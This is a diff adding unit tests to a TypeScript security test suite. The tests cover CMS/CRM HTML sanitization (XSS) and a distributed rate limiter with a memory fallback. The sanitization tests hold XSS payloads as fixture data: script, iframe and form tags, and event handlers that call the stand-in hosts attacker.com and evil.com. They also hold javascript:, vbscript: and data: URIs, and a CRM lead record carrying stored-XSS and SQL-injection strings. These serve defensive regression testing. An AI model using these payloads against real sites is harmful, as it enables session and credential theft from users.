@@ -3,6 +3,13 @@ import assert from 'node:assert/strict';
 import crypto from 'node:crypto';
 import DOMPurify from 'isomorphic-dompurify';
 import { sanitizeSvgContent } from '../src/lib/svgSanitizer';
+import { sanitizeCmsHtml, escapeHtml, sanitizeUrl } from '../src/lib/htmlSanitizer';
+import { 
+  MemoryRateLimitStore, 
+  DistributedRateLimitStore, 
+  getClientIp, 
+  SharedStoreProvider 
+} from '../src/lib/rateLimiter';
 
 // Server-level security utilities replicated for unit testing & regression verification
 const OFFICIAL_ADMIN_EMAIL = 'probitianofficial@gmail.com';
@@ -344,5 +351,210 @@ describe('7. Production Fail-Closed Behavior', () => {
   test('development / preview environment allows storage initialization', () => {
     assert.strictEqual(checkFailClosedStorage('development', false), true);
     assert.strictEqual(checkFailClosedStorage('production', true), true);
+  });
+});
+
+describe('8. CMS/CRM Rich-Content XSS & HTML Sanitization Hardening', () => {
+  test('strips dangerous <script>, <iframe>, <object>, <embed>, and <form> tags', () => {
+    const dirtyHtml = `
+      <div>
+        <h2>Welcome to ProBitian Newsletter</h2>
+        <script>alert('xss')</script>
+        <iframe src="https://attacker.com/steal"></iframe>
+        <object data="evil.swf"></object>
+        <embed src="evil.swf">
+        <form action="https://attacker.com"><input name="cred"/></form>
+        <p>Safe content here.</p>
+      </div>
+    `;
+
+    const cleaned = sanitizeCmsHtml(dirtyHtml);
+    assert.ok(!cleaned.includes('<script'));
+    assert.ok(!cleaned.includes('<iframe'));
+    assert.ok(!cleaned.includes('<object'));
+    assert.ok(!cleaned.includes('<embed'));
+    assert.ok(!cleaned.includes('<form'));
+    assert.ok(cleaned.includes('Safe content here.'));
+  });
+
+  test('removes inline event handlers (onload, onerror, onclick, onmouseover)', () => {
+    const dirtyHtml = `
+      <img src="https://example.com/pic.jpg" onerror="alert(1)" onload="fetch('https://evil.com')" />
+      <a href="https://probitian.com" onclick="alert('clicked')" onmouseover="alert('hover')">Click me</a>
+      <div onfocus="alert('focused')">Content</div>
+    `;
+
+    const cleaned = sanitizeCmsHtml(dirtyHtml);
+    assert.ok(!cleaned.includes('onerror'));
+    assert.ok(!cleaned.includes('onload'));
+    assert.ok(!cleaned.includes('onclick'));
+    assert.ok(!cleaned.includes('onmouseover'));
+    assert.ok(!cleaned.includes('onfocus'));
+    assert.ok(cleaned.includes('https://probitian.com'));
+  });
+
+  test('neutralizes javascript:, vbscript:, and data: URI pseudo-protocols', () => {
+    const maliciousLinks = `
+      <a href="javascript:alert('XSS')">JavaScript Link</a>
+      <a href="javascript&#x3A;alert(1)">Encoded Link</a>
+      <a href="vbscript:msgbox(1)">VBScript Link</a>
+      <a href="data:text/html,<script>alert(1)</script>">Data URI Link</a>
+      <a href="https://probitian.com/courses">Valid Link</a>
+    `;
+
+    const cleaned = sanitizeCmsHtml(maliciousLinks);
+    assert.ok(!cleaned.includes('href="javascript:'));
+    assert.ok(!cleaned.includes('href="vbscript:'));
+    assert.ok(!cleaned.includes('href="data:'));
+    assert.ok(cleaned.includes('href="https://probitian.com/courses"'));
+  });
+
+  test('escapeHtml safely converts special HTML characters to entities', () => {
+    const rawInput = '<script>alert("hello & welcome")</script>\'';
+    const escaped = escapeHtml(rawInput);
+    assert.strictEqual(escaped, '&lt;script&gt;alert(&quot;hello &amp; welcome&quot;)&lt;/script&gt;&#39;');
+  });
+
+  test('sanitizeUrl allows safe http, https, mailto, tel links and rejects javascript / data URIs', () => {
+    assert.strictEqual(sanitizeUrl('https://x.com/Probitian'), 'https://x.com/Probitian');
+    assert.strictEqual(sanitizeUrl('mailto:probitianofficial@gmail.com'), 'mailto:probitianofficial@gmail.com');
+    assert.strictEqual(sanitizeUrl('tel:+919876543210'), 'tel:+919876543210');
+    assert.strictEqual(sanitizeUrl('javascript:alert(1)', '#'), '#');
+    assert.strictEqual(sanitizeUrl('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', '#'), '#');
+    assert.strictEqual(sanitizeUrl('vbscript:alert(1)', '#'), '#');
+  });
+
+  test('prevents CRM lead interpolation injection via malicious lead records', () => {
+    const maliciousLead = {
+      company_name: '"><script>alert("Stored CRM XSS")</script><input value="',
+      contact_person: 'Shivam<img src=x onerror=alert(1)>',
+      industry: "Retail & E-commerce ' OR 1=1 --",
+      powerbi_use_case: '<a href="javascript:steal()">Dashboard</a>'
+    };
+
+    const template = 'Hello {{contact_person}} at {{company_name}} in {{industry}} for {{powerbi_use_case}}';
+    
+    // Simulate safe HTML interpolation with escapeHtml
+    let interpolated = template;
+    for (const [key, val] of Object.entries(maliciousLead)) {
+      const safeVal = escapeHtml(val);
+      interpolated = interpolated.replace(new RegExp(`{{\\s*${key}\\s*}}`, 'gi'), safeVal);
+    }
+
+    const sanitizedHtml = sanitizeCmsHtml(interpolated);
+
+    assert.ok(!sanitizedHtml.includes('<script>'));
+    assert.ok(!sanitizedHtml.includes('onerror=alert(1)'));
+    assert.ok(!sanitizedHtml.includes('href="javascript:steal()"'));
+    assert.ok(sanitizedHtml.includes('&lt;script&gt;alert(&quot;Stored CRM XSS&quot;)&lt;/script&gt;'));
+  });
+});
+
+describe('9. Distributed Rate-Limit Store & Fail-Safe In-Memory Fallback', () => {
+  test('MemoryRateLimitStore limits requests within sliding window', async () => {
+    const store = new MemoryRateLimitStore(100);
+    const key = 'test:ip:10.0.0.1';
+    const windowMs = 500;
+    const max = 3;
+
+    const r1 = await store.increment(key, windowMs, max);
+    assert.strictEqual(r1.allowed, true);
+    assert.strictEqual(r1.count, 1);
+    assert.strictEqual(r1.remaining, 2);
+
+    const r2 = await store.increment(key, windowMs, max);
+    assert.strictEqual(r2.allowed, true);
+    assert.strictEqual(r2.count, 2);
+    assert.strictEqual(r2.remaining, 1);
+
+    const r3 = await store.increment(key, windowMs, max);
+    assert.strictEqual(r3.allowed, true);
+    assert.strictEqual(r3.count, 3);
+    assert.strictEqual(r3.remaining, 0);
+
+    const r4 = await store.increment(key, windowMs, max);
+    assert.strictEqual(r4.allowed, false);
+    assert.strictEqual(r4.count, 3);
+    assert.strictEqual(r4.remaining, 0);
+  });
+
+  test('DistributedRateLimitStore syncs state across instances via shared provider', async () => {
+    const sharedData = new Map<string, { count: number; reset_time: number }>();
+    const mockProvider: SharedStoreProvider = {
+      async getRecord(key: string) {
+        return sharedData.get(key) || null;
+      },
+      async setRecord(key: string, count: number, reset_time: number) {
+        sharedData.set(key, { count, reset_time });
+      }
+    };
+
+    // Instance 1 and Instance 2 share the same backend store
+    const instance1 = new DistributedRateLimitStore(mockProvider);
+    const instance2 = new DistributedRateLimitStore(mockProvider);
+
+    const clientKey = 'login:172.16.0.5';
+    const windowMs = 10000;
+    const max = 3;
+
+    // Instance 1 handles request 1
+    const res1 = await instance1.increment(clientKey, windowMs, max);
+    assert.strictEqual(res1.allowed, true);
+    assert.strictEqual(res1.count, 1);
+
+    // Instance 2 handles request 2 (synchronized state)
+    const res2 = await instance2.increment(clientKey, windowMs, max);
+    assert.strictEqual(res2.allowed, true);
+    assert.strictEqual(res2.count, 2);
+
+    // Instance 1 handles request 3
+    const res3 = await instance1.increment(clientKey, windowMs, max);
+    assert.strictEqual(res3.allowed, true);
+    assert.strictEqual(res3.count, 3);
+
+    // Instance 2 handles request 4 -> BLOCKED across all instances
+    const res4 = await instance2.increment(clientKey, windowMs, max);
+    assert.strictEqual(res4.allowed, false);
+  });
+
+  test('DistributedRateLimitStore fails safe to local memory if shared store is unreachable', async () => {
+    let callCount = 0;
+    const faultyProvider: SharedStoreProvider = {
+      async getRecord() {
+        callCount++;
+        throw new Error('Database connection timeout (503)');
+      },
+      async setRecord() {
+        callCount++;
+        throw new Error('Database connection timeout (503)');
+      }
+    };
+
+    const store = new DistributedRateLimitStore(faultyProvider);
+    const key = 'contact:192.168.1.50';
+    const windowMs = 10000;
+    const max = 2;
+
+    // First request fails over to memory fallback without throwing 500
+    const res1 = await store.increment(key, windowMs, max);
+    assert.strictEqual(res1.allowed, true);
+    assert.strictEqual(res1.count, 1);
+
+    const res2 = await store.increment(key, windowMs, max);
+    assert.strictEqual(res2.allowed, true);
+    assert.strictEqual(res2.count, 2);
+
+    const res3 = await store.increment(key, windowMs, max);
+    assert.strictEqual(res3.allowed, false); // Memory fallback still enforces protection!
+    assert.strictEqual(store.isUsingFallback(), true);
+  });
+
+  test('getClientIp normalizes IPv4-mapped IPv6 addresses', () => {
+    const mockReq = {
+      ip: '::ffff:192.0.2.1',
+      socket: { remoteAddress: '::ffff:192.0.2.1' }
+    } as any;
+
+    assert.strictEqual(getClientIp(mockReq), '192.0.2.1');
   });
 });
